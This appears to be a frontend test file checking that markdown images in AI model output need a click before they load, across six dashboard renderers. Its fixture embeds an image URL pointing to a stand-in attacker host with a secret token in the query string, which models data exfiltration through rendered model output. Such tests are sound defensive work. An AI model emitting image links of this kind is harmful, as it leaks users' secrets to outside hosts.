import { fireEvent, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { renderWithProviders } from "@/../tests/test-utils";
import ChatMessageBubble from "@/app/(dashboard)/playground/components/chat_ui/ChatMessageBubble";
import { MessageDisplay } from "@/app/(dashboard)/playground/components/compareUI/components/MessageDisplay";
import MessageBubble from "@/app/(dashboard)/prompts/_components/prompt_editor_view/conversation_panel/MessageBubble";
import UsageAIChatPanel from "@/app/(dashboard)/usage/_components/components/UsageAIChatPanel";
import { ChatMessageContent } from "@/components/chat/ChatMessages";
import { EndpointType } from "@/components/chat_ui/mode_endpoint_mapping";
import ReasoningContent from "@/components/chat_ui/ReasoningContent";

type UsageAiChatStream = typeof import("@/components/networking").usageAiChatStream;

const REMOTE_SRC = "http://attacker.example:4444/chart.png?token=secret";
const MODEL_OUTPUT = `Weekly report\n\n![Weekly chart](${REMOTE_SRC})`;

vi.mock("@/components/networking", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/components/networking")>()),
  modelHubCall: vi.fn().mockResolvedValue({ data: [{ model_group: "gpt-4o-mini" }] }),
  usageAiChatStream: vi.fn(async (...args: Parameters<UsageAiChatStream>) => {
    const [, , , onChunk, onDone] = args;
    onChunk(MODEL_OUTPUT);
    onDone();
  }),
}));

async function expectClickToLoad() {
  const load = await screen.findByRole("button", { name: /attacker\.example:4444 Load image/ });
  expect(screen.queryByRole("img")).not.toBeInTheDocument();

  fireEvent.click(load);

  expect(screen.getByRole("img", { name: "Weekly chart" })).toHaveAttribute("src", REMOTE_SRC);
}

describe("model output images are click-to-load in every markdown renderer", () => {
  it("chat page assistant bubble", async () => {
    renderWithProviders(
      <ChatMessageContent message={{ id: "a1", role: "assistant", content: MODEL_OUTPUT, timestamp: 0 }} />,
    );
    await expectClickToLoad();
  });

  it("playground chat bubble", async () => {
    renderWithProviders(
      <ChatMessageBubble
        message={{ role: "assistant", content: MODEL_OUTPUT, model: "gpt-4o-mini" }}
        isLastMessage={false}
        endpointType={EndpointType.CHAT}
        mcpEvents={[]}
        codeInterpreterResult={null}
        accessToken="test-token"
      />,
    );
    await expectClickToLoad();
  });

  it("playground compare view", async () => {
    renderWithProviders(
      <MessageDisplay
        messages={[
          { role: "user", content: "Weekly status?" },
          { role: "assistant", content: MODEL_OUTPUT, model: "gpt-4o-mini" },
        ]}
        isLoading={false}
      />,
    );
    await expectClickToLoad();
  });

  it("prompt editor conversation bubble", async () => {
    renderWithProviders(<MessageBubble message={{ role: "assistant", content: MODEL_OUTPUT, model: "gpt-4o-mini" }} />);
    await expectClickToLoad();
  });

  it("reasoning content", async () => {
    renderWithProviders(<ReasoningContent reasoningContent={MODEL_OUTPUT} />);
    await expectClickToLoad();
  });

  it("usage Ask AI panel", async () => {
    renderWithProviders(<UsageAIChatPanel open={true} onClose={vi.fn()} accessToken="test-token" />);
    fireEvent.change(screen.getByPlaceholderText("Ask about your usage..."), { target: { value: "Weekly status?" } });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    await expectClickToLoad();

    fireEvent.change(screen.getByPlaceholderText("Ask about your usage..."), { target: { value: "And next week?" } });
    expect(screen.getByRole("img", { name: "Weekly chart" })).toHaveAttribute("src", REMOTE_SRC);
  });
});
